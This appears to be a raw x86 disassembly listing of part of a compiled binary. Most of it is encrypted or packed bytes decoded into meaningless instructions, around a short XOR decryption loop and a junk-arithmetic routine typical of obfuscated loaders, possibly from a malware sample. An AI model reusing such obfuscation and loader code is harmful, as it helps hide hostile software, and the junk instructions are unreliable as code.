  403112:	icebp  
  403113:	and    al,0xd
  403115:	cld    
  403116:	sub    ch,BYTE PTR [ebp+0x6118476c]
  40311c:	mov    al,ds:0xdab6f6fe
  403121:	stc    
  403122:	mov    esp,0x722d1ba5
  403127:	out    0x12,al
  403129:	repnz cmp DWORD PTR [edx-0x35ff8cb0],0xffffffa2
  403131:	arpl   WORD PTR [esi+ebp*2-0x54],di
  403135:	popf   
  403136:	push   edx
  403137:	shl    BYTE PTR [edi+0x69],1
  40313a:	cwde   
  40313b:	fs in  eax,0xdb
  40313e:	sbb    dh,BYTE PTR [edx]
  403140:	xchg   ecx,eax
  403141:	push   eax
  403142:	(bad)
  403146:	retf   0x8171
  403149:	or     DWORD PTR [ebx],eax
  40314b:	fsubr  DWORD PTR [edi+ebx*8]
  40314e:	or     al,0x95
  403150:	int3   
  403151:	test   al,0x30
  403153:	mov    ds:0x505c9ca2,eax
  403158:	sub    DWORD PTR [eax],0x9291ddff
  40315e:	sbb    eax,0xcbe36fbe
  403163:	fist   WORD PTR [edx+0x13]
  403166:	(bad)  
  403167:	jmp    0x79d8c65b
  40316c:	mov    al,ds:0x72ebd4f7
  403171:	mov    gs,edi
  403173:	mov    ebp,0xdd2de62a
  403178:	sbb    ch,BYTE PTR [eax+0x121620b5]
  40317e:	and    BYTE PTR [edi+0x3afd5fa7],al
  403184:	xchg   esi,eax
  403185:	scas   al,BYTE PTR es:[edi]
  403186:	add    bl,ah
  403188:	adc    DWORD PTR [esi],ecx
  40318a:	js     0x403177
  40318c:	and    eax,0x7658cfe8
  403191:	retf   
  403192:	and    BYTE PTR [edx-0x63a76795],ah
  403198:	scas   ax,WORD PTR es:[edi]
  40319a:	popf   
  40319b:	dec    eax
  40319c:	push   ss
  40319d:	aas    
  40319e:	(bad)  
  40319f:	cdq    
  4031a0:	inc    esp
  4031a1:	add    cl,cl
  4031a3:	jle    0x4031be
  4031a5:	aam    0xf
  4031a7:	push   cs
  4031a8:	popf   
  4031a9:	sub    BYTE PTR [ecx],bh
  4031ab:	test   ch,bl
  4031ad:	cmp    al,0x5a
  4031af:	push   es
  4031b0:	and    edi,0x5528fcf9
  4031b6:	add    ebp,eax
  4031b8:	sbb    eax,0x19f2b0a1
  4031bd:	out    dx,eax
  4031be:	sub    DWORD PTR [ecx],0x3
  4031c1:	in     eax,0x64
  4031c3:	(bad)  
  4031c4:	std    
  4031c5:	retf   0x77a4
  4031c8:	ja     0x403228
  4031ca:	inc    eax
  4031cb:	xchg   esp,eax
  4031cc:	jno    0x4031df
  4031ce:	adc    cl,BYTE PTR [ecx-0x204c52c3]
  4031d4:	sub    al,BYTE PTR [ebx]
  4031d6:	xor    bl,dl
  4031d8:	ds (bad) 
  4031da:	in     eax,0xa2
  4031dc:	call   0x4fdb080a
  4031e1:	or     ebp,DWORD PTR [edx+0x3bcbab6c]
  4031e7:	inc    ecx
  4031e8:	mov    ch,0xc3
  4031ea:	fwait
  4031eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ec:	es clc 
  4031ee:	shr    ah,cl
  4031f0:	ror    BYTE PTR [ecx+ebp*1-0xe27ef1a],cl
  4031f7:	sbb    eax,0x699ea91b
  4031fc:	and    cl,dh
  4031fe:	jp     0x403248
  403200:	add    edi,edi
  403202:	mov    esp,0x5bed1549
  403207:	cmp    al,0x59
  403209:	cmp    al,0xd8
  40320b:	xor    BYTE PTR [ebx-0x2b64830b],bl
  403211:	inc    esp
  403212:	ret    0x26b1
  403215:	sub    eax,0x48ae878c
  40321a:	aad    0x8a
  40321c:	iret   
  40321d:	lds    ecx,FWORD PTR [ecx]
  40321f:	push   cs
  403220:	popf   
  403221:	push   ecx
  403222:	jl     0x403209
  403224:	retf   0x6650
  403227:	jnp    0x40326e
  403229:	neg    BYTE PTR [esi+0x6c439e46]
  40322f:	xor    bl,BYTE PTR [ecx]
  403231:	add    ch,BYTE PTR [edx]
  403233:	popf   
  403234:	in     eax,0x60
  403236:	and    BYTE PTR [ebx],bl
  403238:	sbb    BYTE PTR [esi+eiz*8-0x63],0x41
  40323d:	imul   eax,DWORD PTR [ebx-0x5a],0xffffffe1
  403241:	ins    DWORD PTR es:[edi],dx
  403242:	jo     0x403236
  403244:	scas   al,BYTE PTR es:[edi]
  403245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403246:	cwde   
  403247:	mov    di,0xd153
  40324b:	mov    BYTE PTR [ecx],ch
  40324d:	sub    eax,0x190e2b0a
  403252:	test   BYTE PTR [ecx-0x4f],0x9e
  403256:	mov    ch,0x86
  403258:	xchg   edi,eax
  403259:	(bad)  
  40325a:	aad    0x46
  40325c:	clc    
  40325d:	stos   BYTE PTR es:[edi],al
  40325e:	push   cs
  40325f:	cwde   
  403260:	jg     0x403233
  403262:	fwait
  403263:	ds inc ecx
  403265:	fucom  st(3)
  403267:	pop    ss
  403268:	push   edx
  403269:	adc    BYTE PTR [esi-0x8],0x64
  40326d:	sub    al,0xf5
  40326f:	cdq    
  403270:	mov    bl,0x4e
  403272:	adc    esi,DWORD PTR [edi+eiz*8+0x69157093]
  403279:	push   edi
  40327a:	dec    edi
  40327b:	repnz sar BYTE PTR [esp+0x437ea991],0xbf
  403284:	mov    DWORD PTR [ebp+0x636b97f8],eax
  40328a:	pop    esi
  40328b:	push   esi
  40328c:	mov    dh,0x5e
  40328e:	xchg   ecx,eax
  40328f:	test   ah,cl
  403291:	xchg   esi,eax
  403292:	push   edi
  403293:	inc    esi
  403294:	popf   
  403295:	js     0x403270
  403297:	fcom   DWORD PTR [edx+0x4bcf6905]
  40329d:	xchg   edi,eax
  40329e:	and    eax,0x8e9d503d
  4032a3:	out    0x47,al
  4032a5:	je     0x403289
  4032a7:	mov    fs,WORD PTR ds:0x9d2cadf0
  4032ad:	push   0x3b
  4032af:	jmp    0x6f361274
  4032b4:	xor    DWORD PTR [eax+0x76],ebp
  4032b7:	mov    ecx,0x9e22dbbc
  4032bc:	push   ebp
  4032bd:	add    DWORD PTR ds:0xa369fe0,0xb897f190
  4032c7:	pop    edx
  4032c8:	inc    ebp
  4032c9:	mov    ebx,0x9b0b1b71
  4032ce:	enter  0x6cef,0xd1
  4032d2:	add    DWORD PTR [edi-0x6],esp
  4032d5:	jno    0x40331d
  4032d7:	mov    ebp,edx
  4032d9:	ret    
  4032da:	addr16 jge 0x4032ff
  4032dd:	loopne 0x40330e
  4032df:	fwait
  4032e0:	adc    dl,BYTE PTR [edi+edi*2+0x55]
  4032e4:	xor    edi,edx
  4032e6:	(bad)  
  4032e8:	push   ss
  4032e9:	mov    bh,0x2
  4032eb:	fsub   DWORD PTR [ecx+0x5]
  4032ee:	jmp    0x83bc605b
  4032f3:	cmp    eax,0xebfd7eef
  4032f8:	mov    ds:0xc3c6f207,al
  4032fd:	test   al,0xe1
  4032ff:	push   es
  403300:	pushf  
  403301:	ret    
  403302:	cld    
  403303:	into   
  403304:	xlat   BYTE PTR ds:[ebx]
  403305:	test   BYTE PTR [edx+0x58],dh
  403308:	pop    edi
  403309:	scas   al,BYTE PTR es:[edi]
  40330a:	ret    
  40330b:	cmc    
  40330c:	xor    ecx,ecx
  40330e:	shl    DWORD PTR [di],0x9d
  403312:	or     al,0x7b
  403314:	sahf   
  403315:	adc    al,0x6e
  403317:	pushf  
  403318:	aaa    
  403319:	ins    DWORD PTR es:[edi],dx
  40331a:	jno    0x403356
  40331c:	xchg   edx,eax
  40331d:	push   edx
  40331e:	dec    eax
  40331f:	pop    ecx
  403320:	loop   0x403377
  403322:	bound  ebp,QWORD PTR [esi-0x5e]
  403325:	test   eax,0xf5a27db0
  40332a:	and    ecx,DWORD PTR [edx-0x77]
  40332d:	xchg   esi,eax
  40332e:	sbb    eax,0x7796d01c
  403333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403334:	out    dx,eax
  403335:	retf   0xc2f
  403338:	jbe    0x403382
  40333a:	test   eax,0xee07bfcd
  40333f:	mov    ah,0x7d
  403341:	sub    bl,dh
  403343:	xchg   ebx,eax
  403344:	call   0x8b5a:0xcd3af17
  40334b:	inc    edx
  40334c:	or     BYTE PTR [eax+0x2432f86e],0x49
  403353:	push   ds
  403354:	mov    eax,ds:0x574daa79
  403359:	(bad)  
  40335a:	lds    ebx,FWORD PTR [ebx-0x15db4a45]
  403360:	cmp    edi,ecx
  403362:	fwait
  403363:	push   ebx
  403364:	inc    ecx
  403365:	frstor [edi]
  403367:	sub    al,0xd6
  403369:	sub    cl,BYTE PTR [edi+0x77]
  40336c:	sbb    al,0xe2
  40336e:	cmp    al,BYTE PTR [edx-0xb4abb3b]
  403374:	adc    al,0xef
  403376:	icebp  
  403377:	push   es
  403378:	mov    cl,dl
  40337a:	jnp    0x40331e
  40337c:	nop
  40337d:	or     DWORD PTR [ecx],0x1a80e69c
  403383:	(bad)  
  403384:	or     cl,BYTE PTR [edi+0xa]
  403387:	mov    dl,0xcf
  403389:	dec    edi
  40338a:	push   ebx
  40338b:	xor    edx,edx
  40338d:	out    dx,eax
  40338e:	ret    
  40338f:	hlt    
  403390:	and    DWORD PTR [edx-0x698dc447],0x7b7e3d60
  40339a:	lods   eax,DWORD PTR ds:[esi]
  40339b:	mov    esi,DWORD PTR [ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	ret    0xe9d7
  4033bc:	cmp    al,0x3a
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x4033ad
  4033c6:	mov    dh,0x68
  4033c8:	sti    
  4033c9:	inc    edx
  4033ca:	hlt    
  4033cb:	mov    esp,0xd051802b
  4033d0:	xor    cl,BYTE PTR [edi+eax*4-0x44]
  4033d4:	data16 stos BYTE PTR es:[edi],al
  4033d6:	or     BYTE PTR [eax+0x17f5ce28],cl
  4033dc:	add    dh,BYTE PTR [ebp+ebx*4+0x8]
  4033e0:	sbb    BYTE PTR [ecx+0x49],dh
  4033e3:	dec    edi
  4033e4:	daa    
  4033e5:	cwde   
  4033e6:	shl    bh,1
  4033e8:	jmp    0x403452
  4033ea:	push   ebx
  4033eb:	lahf   
  4033ec:	imul   ebp,DWORD PTR [eax-0x47c502a0],0x23
  4033f3:	add    ch,al
  4033f5:	mov    dh,0x43
  4033f7:	retf   0xcf9e
  4033fa:	pop    eax
  4033fb:	loopne 0x403420
  4033fd:	aas    
  4033fe:	mov    edi,0x365cf08c
  403403:	icebp  
  403404:	cmc    
  403405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403406:	jne    0x40344a
  403408:	sbb    BYTE PTR [ebx+ebx*2+0x57a92f6],al
  40340f:	fistp  QWORD PTR [esi]
  403411:	xor    DWORD PTR [ebp+0x42],ecx
  403414:	fisub  DWORD PTR ds:0x7d8d676f
  40341a:	cmp    al,0xa6
  40341c:	cmp    BYTE PTR gs:[esi+0x64],ch
  403420:	dec    ebx
  403421:	dec    eax
  403422:	loop   0x4033f2
  403424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403425:	mov    ch,0x78
  403427:	cwde   
  403428:	cld    
  403429:	addr16 dec esp
  40342b:	xchg   edx,eax
  40342c:	push   ds
  40342d:	sbb    DWORD PTR [esi+0x2823eed9],edi
  403433:	push   0x4ffe9d46
  403438:	mov    dh,0x8e
  40343a:	test   ecx,0x88e90d33
  403440:	adc    al,0xa7
  403442:	dec    ebx
  403443:	call   0xbfc1e8b7
  403448:	jmp    0x403416
  40344a:	xlat   BYTE PTR ds:[ebx]
  40344b:	int    0x4c
  40344d:	mov    bl,ch
  40344f:	nop
  403450:	int3   
  403451:	pushf  
  403452:	sahf   
  403453:	sbb    eax,0x5232c387
  403458:	out    0x3,al
  40345a:	mov    al,ds:0x912f94ad
  40345f:	into   
  403460:	adc    ah,dh
  403462:	out    dx,eax
  403463:	cmp    BYTE PTR [edi],ch
  403465:	stc    
  403466:	pop    esp
  403467:	adc    BYTE PTR [ecx],0x9b
  40346a:	popa   
  40346b:	call   0x3260:0x22d4f9c2
  403472:	sbb    ebp,eax
  403474:	sbb    al,0x1c
  403476:	push   esp
  403477:	call   0x1c3b:0xd2c64886
  40347e:	hlt    
  40347f:	pusha  
  403480:	fwait
  403481:	jl     0x4034de
  403483:	jp     0x403481
  403485:	loopne 0x403464
  403487:	in     al,0xc7
  403489:	repnz or ecx,ecx
  40348c:	dec    ebx
  40348d:	cdq    
  40348e:	jg     0x4034d7
  403490:	mov    edx,0x36dd3a84
  403495:	inc    esp
  403496:	add    esi,edx
  403498:	and    ecx,DWORD PTR [edi-0x52]
  40349b:	scas   al,BYTE PTR es:[edi]
  40349c:	bound  edx,QWORD PTR [ecx+esi*2+0x3de304a8]
  4034a3:	or     edi,esi
  4034a5:	xor    al,0x7a
  4034a7:	clc    
  4034a8:	adc    ah,dl
  4034aa:	mov    esi,0x98407437
  4034af:	add    ah,BYTE PTR [edi+0xf00e551]
  4034b5:	add    DWORD PTR [ebx+0x43],edx
  4034b8:	jbe    0x40345f
  4034ba:	jmp    0xeec9:0x14a0d246
  4034c1:	jae    0x40351c
  4034c3:	ds add al,0x8
  4034c6:	pop    ebx
  4034c7:	into   
  4034c8:	fsubp  st(3),st
  4034ca:	sbb    al,0xb5
  4034cc:	int    0x5f
  4034ce:	mov    eax,0x3252379e
  4034d3:	into   
  4034d4:	out    dx,al
  4034d5:	xor    ebp,DWORD PTR [edi-0x27]
  4034d8:	hlt    
  4034d9:	mov    al,0x23
  4034db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034dc:	push   ebx
  4034dd:	or     eax,0xecd78526
  4034e2:	fimul  DWORD PTR [edi+0x6408b2c9]
  4034e8:	push   0xda6c9a9
  4034ed:	rcl    DWORD PTR ds:0xd11eaf9b,1
  4034f3:	push   esp
  4034f4:	(bad)  
  4034f5:	cmc    
  4034f6:	ret    
  4034f7:	or     al,0xab
  4034f9:	stos   BYTE PTR es:[edi],al
  4034fa:	not    DWORD PTR [eax]
  4034fc:	aad    0x5
  4034fe:	jge    0x403503
  403500:	sub    dl,BYTE PTR [ebx+0x12]
  403503:	js     0x403560
  403505:	xchg   esi,eax
  403506:	dec    ecx
  403507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403508:	cmp    BYTE PTR [edi-0x7f],dl
  40350b:	loope  0x40355c
  40350d:	adc    DWORD PTR [edx+0xf],0x76
  403511:	arpl   WORD PTR [edi+ecx*2+0x4f5a0926],sp
  403518:	call   0x73bf8226
  40351d:	test   eax,0xaef82814
  403522:	dec    ebx
  403523:	je     0x4034d9
  403525:	and    eax,0x3688aa8e
  40352a:	xor    ecx,DWORD PTR [ebx]
  40352c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40352d:	push   ecx
  40352e:	inc    ebx
  40352f:	mov    fs,WORD PTR [eax-0x39bde213]
  403535:	pop    ebp
  403536:	(bad)  
  403537:	lds    esi,FWORD PTR [edi+0x3f]
  40353a:	aam    0x24
  40353c:	mov    edx,0xc3eea2ff
  403541:	outs   dx,DWORD PTR ds:[esi]
  403542:	jmp    0xd613:0x7e0808c2
  403549:	bound  edx,QWORD PTR [esi+0x68361811]
  40354f:	adc    al,0xf2
  403551:	vpaddusw ymm5,ymm5,YMMWORD PTR [edx]
  403555:	pushf  
  403556:	xchg   edx,eax
  403557:	nop
  403558:	xchg   edx,eax
  403559:	jnp    0x4035cf
  40355b:	jo     0x25e44e81
  403561:	popa   
  403562:	cmp    BYTE PTR ds:0xa8438ac1,0x2f
  403569:	mov    bl,0xe4
  40356b:	adc    eax,0x909c826f
  403570:	push   edi
  403571:	hlt    
  403572:	(bad)  [esi]
  403574:	dec    edx
  403575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403576:	push   ecx
  403577:	sbb    BYTE PTR [edx-0x10],dh
  40357a:	sub    BYTE PTR [ecx+0x14842d8c],al
  403580:	xlat   BYTE PTR ds:[ebx]
  403581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403582:	mov    al,0x7
  403584:	sub    dh,0x83
  403587:	adc    esp,DWORD PTR [esi-0x6f]
  40358a:	xor    BYTE PTR [ebx-0x6e],ah
  40358d:	pop    esi
  40358e:	into   
  40358f:	xchg   ebx,eax
  403590:	fld    QWORD PTR [edx-0x6d]
  403593:	pop    ebx
  403594:	mov    esp,0x99d266a9
  403599:	sbb    al,BYTE PTR [ecx+ebx*4+0x724ed95a]
  4035a0:	shl    BYTE PTR ds:0x196c7058,0x29
  4035a7:	scas   al,BYTE PTR es:[edi]
  4035a8:	sbb    al,0xcd
  4035aa:	mov    al,ds:0xd3d32a7
  4035af:	out    0xe2,eax
  4035b1:	out    0x6d,eax
  4035b3:	out    dx,eax
  4035b4:	out    0xb3,eax
  4035b6:	in     eax,dx
  4035b7:	fcom   DWORD PTR ds:0x11a9b0c0
  4035bd:	mov    eax,ds:0xccc2977e
  4035c2:	and    DWORD PTR [ebx+0x61b6803e],edx
  4035c8:	out    dx,eax
  4035c9:	and    edx,ebx
  4035cb:	jl     0x403645
  4035cd:	nop
  4035ce:	xor    al,0xe
  4035d0:	test   BYTE PTR [edx+0x25],0xac
  4035d4:	cmp    BYTE PTR [eax-0x58],dl
  4035d7:	xor    eax,0xc11c0e53
  4035dc:	ja     0x40359a
  4035de:	mov    dh,0x24
  4035e0:	adc    eax,0x3d739418
  4035e5:	sbb    eax,0xf017216c
  4035ea:	jae    0x403571
  4035ec:	ins    DWORD PTR es:[edi],dx
  4035ed:	inc    ebx
  4035ee:	xchg   edx,eax
  4035ef:	std    
  4035f0:	xor    al,0x57
  4035f2:	std    
  4035f3:	mov    esp,0xb863772e
  4035f8:	pop    ss
  4035f9:	popa   
  4035fa:	jnp    0x403672
  4035fc:	mov    eax,0xde044192
  403601:	xor    ebx,DWORD PTR [esi+0xcf535ee]
  403607:	loopne 0x403664
  403609:	xor    al,BYTE PTR [ebx+0x4f]
  40360c:	xchg   edx,eax
  40360d:	sub    DWORD PTR [eax],ebx
  40360f:	inc    eax
  403610:	arpl   WORD PTR [esi],sp
  403612:	jno    0x40365c
  403614:	lock sti 
  403616:	stc    
  403617:	dec    ecx
  403618:	cmp    eax,0x3fafee97
  40361d:	jo     0x4035fa
  40361f:	ret    
  403620:	in     eax,0x67
  403622:	arpl   WORD PTR [eax],bx
  403624:	sub    eax,0xd3478c1b
  403629:	push   ecx
  40362a:	mov    ch,0x53
  40362c:	cmp    eax,0xad96df1
  403631:	inc    edi
  403632:	arpl   WORD PTR [ecx],si
  403634:	pop    eax
  403635:	cmp    esp,DWORD PTR [ecx-0x5b]
  403638:	xor    BYTE PTR [eax],ah
  40363a:	js     0x4035da
  40363c:	mov    dl,0x5c
  40363e:	ret    0xb3e9
  403641:	or     al,0x48
  403643:	cmc    
  403644:	pop    ebp
  403645:	pop    edi
  403646:	mov    bh,0x15
  403648:	dec    edx
  403649:	xchg   ebp,eax
  40364a:	(bad)  
  40364c:	cld    
  40364d:	xor    DWORD PTR [ebp-0x108236ac],esi
  403653:	add    edx,ecx
  403655:	mov    edx,0xb5bc47ac
  40365a:	pop    ss
  40365b:	loopne 0x403608
  40365d:	add    dl,BYTE PTR [eax-0x69521839]
  403663:	push   ds
  403664:	lahf   
  403665:	shr    DWORD PTR [edi],1
  403667:	rcr    BYTE PTR [edi-0x56],1
  40366a:	repnz and BYTE PTR [esi+0x76],al
  40366e:	xlat   BYTE PTR ds:[ebx]
  40366f:	adc    al,0x91
  403671:	push   ebp
  403672:	fwait
  403673:	cmp    BYTE PTR [ebp-0x45],ch
  403676:	cmp    ebx,eax
  403678:	jmp    0xf177:0xdd190c71
  40367f:	iret   
  403680:	in     al,dx
  403681:	ffreep st(6)
  403683:	icebp  
  403684:	cmc    
  403685:	int    0xb2
  403687:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fded,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fded,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fded,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e3d7
  4036fc:	cmp    DWORD PTR ds:0x42fded,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fded
  403711:	dec    eax
  403712:	mov    ds:0x42fded,eax
  403717:	mov    eax,ds:0x42fded
  40371c:	dec    eax
  40371d:	mov    ds:0x42fded,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e7f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e7f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fe0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e813,0x42e21c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fe7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e224,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e80f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ebx+0x12],ebp
  4037a3:	dec    ebx
  4037a4:	push   ds
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0x1070707d
  4037ae:	inc    esi
  4037af:	xor    ah,cl
  4037b1:	and    BYTE PTR [ebp-0x4d],ch
  4037b4:	je     0x403753
  4037b6:	aas    
  4037b7:	ins    BYTE PTR es:[edi],dx
  4037b8:	fist   DWORD PTR [esi-0x2f]
  4037bb:	and    eax,0xb0ba5cf3
  4037c0:	xchg   edi,eax
  4037c1:	jne    0x4037dd
  4037c3:	dec    eax
  4037c4:	test   ebx,edx
  4037c6:	jns    0x40377d
  4037c8:	shl    ch,1
  4037ca:	jbe    0x403808
  4037cc:	in     al,dx
  4037cd:	outs   dx,BYTE PTR gs:[esi]
  4037cf:	(bad)  
  4037d0:	nop
  4037d1:	mov    cl,al
  4037d3:	adc    bh,BYTE PTR ds:0xfeeb6760
  4037d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037da:	cmc    
  4037db:	dec    ebp
  4037dc:	mov    bh,0xdb
  4037de:	pop    edi
  4037df:	jmp    0x9b2c:0x3745f4a4
  4037e6:	loop   0x40376c
  4037e8:	jp     0x403837
  4037ea:	inc    ebx
  4037eb:	retf   0x77c6
  4037ee:	or     cl,BYTE PTR [edi-0x73a28aa]
  4037f4:	mov    ds:0xf48722c2,al
  4037f9:	mov    dl,0xa5
  4037fb:	mov    ecx,DWORD PTR [edx+0x1cd838f3]
  403801:	sub    BYTE PTR [ebp-0x4fd17253],bl
  403807:	aaa    
  403808:	inc    edi
  403809:	push   ss
  40380a:	add    edi,DWORD PTR [esi+0x568f522c]
  403810:	pop    ebp
  403811:	xor    BYTE PTR [ebx],bl
  403813:	xor    al,0x47
  403815:	pushw  ss
  403817:	sbb    DWORD PTR [ebp-0x3406e82],ecx
  40381d:	dec    edx
  40381e:	and    BYTE PTR [ebp+0x1feeab83],al
  403824:	jecxz  0x403847
  403826:	push   0x2f
  403828:	shr    DWORD PTR [ecx+eax*2],1
  40382b:	adc    eax,0x122c8d71
  403830:	popa   
  403831:	inc    edx
  403832:	fidiv  DWORD PTR [ebx]
  403834:	mov    dl,BYTE PTR [eax+0xb]
  403837:	fwait
  403838:	lds    ebx,FWORD PTR [ebp-0x1a7b0558]
  40383e:	cli    
  40383f:	xor    dh,BYTE PTR [ecx-0x2b670b4a]
  403845:	mov    eax,ecx
  403847:	or     eax,0x23e4fcd
  40384c:	cmp    al,0x8f
  40384e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40384f:	mov    esi,0xe41db4bb
  403854:	je     0x4037ee
  403856:	push   0xd25a915c
  40385b:	cli    
  40385c:	sub    BYTE PTR [eax+0x336b7fae],al
  403862:	sahf   
  403863:	imul   esp,DWORD PTR [ebx+0x5ba7f836],0xedb8cabf
  40386d:	(bad)  
  40386e:	push   ecx
  40386f:	xchg   ebx,eax
  403870:	in     eax,dx
  403871:	stos   DWORD PTR es:[edi],eax
  403872:	push   ds
  403873:	imul   ecx,esi,0xfffffffb
  403876:	jne    0x403891
  403878:	repnz pop eax
  40387a:	mov    dh,0x22
  40387c:	vcvtss2sd xmm0,xmm7,DWORD PTR [edx+0x2d57f778]
  403884:	dec    ecx
  403885:	xchg   ebx,eax
  403886:	or     BYTE PTR [ebx+0x7ea0788],ah
  40388c:	add    al,0x86
  40388e:	lahf   
  40388f:	pop    esp
  403890:	(bad)  
  403891:	jmp    0x403829
  403893:	imul   edx,edx,0x9ab56567
  403899:	imul   edx,DWORD PTR [ebx-0x7738561a],0xac18dd16
  4038a3:	mov    ah,0xf9
  4038a5:	xchg   ebp,eax
  4038a6:	scas   al,BYTE PTR es:[edi]
  4038a7:	xlat   BYTE PTR ds:[ebx]
  4038a8:	shr    ecx,1
  4038aa:	push   0xffffffa2
  4038ac:	inc    esi
  4038ad:	pusha  
  4038ae:	idiv   DWORD PTR [eax-0x69f4e97c]
  4038b4:	and    bh,BYTE PTR [edi+0x564e7d84]
  4038ba:	ins    DWORD PTR es:[edi],dx
  4038bb:	mov    ebx,0x3ef73889
  4038c0:	sahf   
  4038c1:	aam    0x76
  4038c3:	mov    dh,ah
  4038c5:	out    dx,al
  4038c6:	adc    DWORD PTR [edi-0x22],esi
  4038c9:	jmp    0x13d332f
  4038ce:	pop    edx
  4038cf:	add    ch,dl
  4038d1:	clc    
  4038d2:	push   edi
  4038d3:	and    bl,BYTE PTR [esi]
  4038d5:	dec    ecx
  4038d6:	loopne 0x403858
  4038d8:	(bad)  
  4038d9:	pop    ecx
  4038da:	repz (bad) 
  4038dc:	(bad)  
  4038dd:	popa   
  4038de:	sbb    eax,0xbb21775e
  4038e3:	xchg   ebx,eax
  4038e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038e5:	push   esp
  4038e6:	out    0x92,eax
  4038e8:	pop    esp
  4038e9:	aas    
  4038ea:	fadd   QWORD PTR ds:0xa26503ac
  4038f0:	out    dx,al
  4038f1:	aaa    
  4038f2:	div    DWORD PTR [ebp-0x4dc60004]
  4038f8:	fsubr  DWORD PTR [ebp+0x43]
  4038fb:	lock dec ebx
  4038fd:	cwde   
  4038fe:	ficomp WORD PTR [edx-0x1b]
  403901:	sub    DWORD PTR [ebx-0x547abf3c],edx
  403907:	mov    fs:0x4a1e38fc,eax
  40390d:	jmp    0x403923
  40390f:	(bad)  
  403910:	and    ch,BYTE PTR [eax-0x50853bc3]
  403916:	out    0xa7,al
  403918:	lods   eax,DWORD PTR ds:[esi]
  403919:	dec    esp
  40391a:	pop    esi
  40391b:	dec    ecx
  40391c:	int    0x5f
  40391e:	push   0x5604ef3b
  403923:	lock pop ds
  403925:	bound  ebp,QWORD PTR [ebp+0x12e67b46]
  40392b:	mov    al,ds:0xa543fe4f
  403930:	sub    eax,ebx
  403932:	add    BYTE PTR [ebp-0x4965d058],dh
  403938:	xor    al,0x0
  40393a:	lock loop 0x403949
  40393d:	loopne 0x4038f0
  40393f:	fnstsw WORD PTR [ecx]
  403941:	je     0x40392b
  403943:	test   eax,0x2c1fa7a
  403948:	pop    edi
  403949:	sbb    dh,BYTE PTR [eax+0x4a234f34]
  40394f:	add    DWORD PTR [ecx],eax
  403951:	je     0x40392d
  403953:	es inc edi
  403955:	popf   
  403956:	and    BYTE PTR [ebx-0xe],dh
  403959:	jecxz  0x403971
  40395b:	cmp    edx,DWORD PTR [eax-0x13]
  40395e:	aas    
  40395f:	push   ecx
  403960:	pop    ecx
  403961:	(bad)  
  403962:	test   al,0x5e
  403964:	in     eax,0xa0
  403966:	xor    al,0xf8
  403968:	test   DWORD PTR [ebx],ecx
  40396a:	pop    ebp
  40396b:	punpckhbw mm0,QWORD PTR [esi+0x47]
  40396f:	shl    DWORD PTR [esi-0x41],1
